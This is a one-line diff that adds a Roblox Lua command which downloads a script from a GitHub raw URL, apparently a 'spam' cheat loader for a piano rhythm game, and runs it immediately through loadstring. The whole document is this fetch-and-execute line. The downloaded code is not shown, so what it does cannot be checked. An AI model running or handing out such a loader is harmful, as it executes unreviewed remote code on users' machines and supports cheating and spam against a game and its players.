@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/piano-rhythm-tiles-spam4-p40z6gwthhha3t.lua"))()
